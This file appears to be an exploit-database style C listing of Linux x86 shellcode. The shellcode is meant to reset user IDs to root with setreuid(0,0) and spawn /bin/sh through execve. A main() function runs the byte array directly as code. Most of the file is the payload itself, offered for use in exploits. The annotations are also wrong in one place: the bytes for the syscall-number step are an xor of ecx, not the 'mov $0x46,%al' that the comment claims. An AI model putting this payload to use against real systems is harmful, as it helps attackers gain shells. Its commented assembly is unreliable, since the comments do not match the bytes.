/*
    Title:  setreuid & execve shellcode (28 bytes)
	Author: blindarcher <blindarcher[no SPAM]outlook dot com>
	Arch:   Linux x86
*/

char shellcode[] =
    // setreuid(0,0)
    "\x31\xdb"              // xor   %ebx,%ebx  	<-- set zero in ebx
    "\xf7\xe3"              // mul   %ebx           	<-- set zero in eax & edx 
    "\x89\xd9"              // mov   %ebx,%ecx		<-- set zero in to ecx
    "\x31\xc9"              // mov   $0x46,%al		<-- set the syscall #0x46 in al
    "\xcd\x80"              // int   $0x80          	<-- call the kernel
    // execve("/bin//sh", 0, 0)
    "\x52"		    // push  %edx		<-- push zero into stack
    "\x68\x2f\x2f\x73\x68"  // push  $0x68732f2f	<-- push the string "//sh" into stack
    "\x68\x2f\x62\x69\x6e"  // push  $0x6e69622f	<-- push the string "/bin" into stack
    "\x89\xe3"              // mov   %esp,%ebx		<-- set the pointer esp into ebx
    "\x6a\x0b"              // push  $0xb		<-- push the syscall #0xb into stack
    "\x58"                  // pop   %eax		<-- pop the syscall #0xb into eax
    "\xcd\x80";             // int   $0x80          	<-- call the kernel

main()
{
    printf("Shellcode lenght: %d bytes\n", strlen(shellcode));
    void (*fp) (void);          // declare a function pointer, fp
    fp = (void *) shellcode;    // set the address of fp to our shellcode
    fp();			// execute the function (our shellcode)
}
